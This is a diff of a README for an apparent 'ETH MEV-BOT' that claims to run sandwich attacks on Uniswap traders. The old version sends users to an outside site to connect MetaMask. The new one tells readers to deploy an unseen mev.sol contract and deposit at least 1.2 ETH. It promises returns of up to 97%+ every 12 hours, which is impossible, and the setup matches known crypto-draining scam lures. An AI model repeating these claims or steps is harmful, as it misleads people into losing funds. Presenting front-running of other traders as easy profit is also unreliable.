@@ -1,61 +1,100 @@
+---
 
-<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>
+<div align="center">
 
-<p align="center">
-  <img src="https://i.ibb.co/7GyC2YQ/getstarted.png">
-</p>
+# 💎🤖 ETH MEV-BOT 🤖💎
+  
+An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.
 
-<p align="center">
-  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
-</p>
+</div>
 
-## Description
+---
 
-The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 
+## 📚 About
 
-⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**
+In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.
 
-## Key Features
+---
 
-- **Wallet Connection**: Supports MetaMask.
-- **Contract Creation**: Users can create smart contracts using our tool.
-- **Script Execution**: The website allows users to execute the created contract and manage its execution.
-- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.
+<div align="center">
 
-## Usage
+## 🚀 How it Works
 
-1. Open the website in a [browser](https://app-mev.com/).
-2. Connect your MetaMask cryptocurrency wallet.
-   
-   <img src="https://i.ibb.co/hVcyXNG/connect.png" alt="connect" border="0">
-4. Create and deploy your bot.
+![profit](https://i.ibb.co/t39DBd6/1.jpg)
 
-<img src="https://i.ibb.co/7NdMPRk/deploy.png" alt="deploy" border="0">
+</div>
 
-4. Fund your bot's contract in two ways:
-   - Enter the amount of Ether in `amount` and click `Deposit`.
-<img src="https://i.ibb.co/9rDSwH9/balance.png" alt="balance" border="0">
+Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.
 
-   - Copy the address of your contract and send the amount of Ether from any wallet.
-<img src="https://i.ibb.co/nr4ymcm/contract.png" alt="contract" border="0">
+---
 
-5. After funding the contract, start the bot by clicking `RUN/SCAN`. 
-   The bot will begin scanning the mempool for unconfirmed transactions.
-   You can monitor its activity in `View Transactions`.
-<img src="https://i.ibb.co/x31mnjC/transaction.png" alt="transactions" border="0">
+## ETH Investment Returns
 
-6. To stop the bot, click `Withdrawal`. 
-   The bot will transfer all funds from the contract to the owner's address (the wallet that created the bot contract).
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
 
-   Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
 
-   The profit depends on network load (gas price) and competition from other MEV bots on the token.
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
 
-## Bot Balance Chart
+---
 
-<img src="https://i.ibb.co/VHRb5zw/chart.png" alt="deploy" border="0">
+## 👨‍💻 Instructions
+
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
 
 
-## License
+<img src="https://i.ibb.co/m8ZQRwp/2.png" alt="2" border="0">
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+2) 🔧 Select compiler version 0.6.12 and press compile.
+
+![2](https://i.ibb.co/2Ns7jqm/3.png)
+
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
+
+![3](https://i.ibb.co/NCsWwyW/4.png)
+
+4) Verify your smart contract on etherscan -
+
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
+
+
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
+
+<img width="780" alt="4" src="https://i.ibb.co/Dp5nXPN/5.png">
+
+7) Withdraw anytime by clicking 'withdrawal'.
+
+:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
+
+At any point, you can stop the bot or retrieve your money by calling the withdrawal function.
+
+<div align="center">
+
+💰💰💰 Make money with MevBot 💰💰💰
+
+</div>
+
+---
+
+##### Please ⭐ the repo to support my project
+---
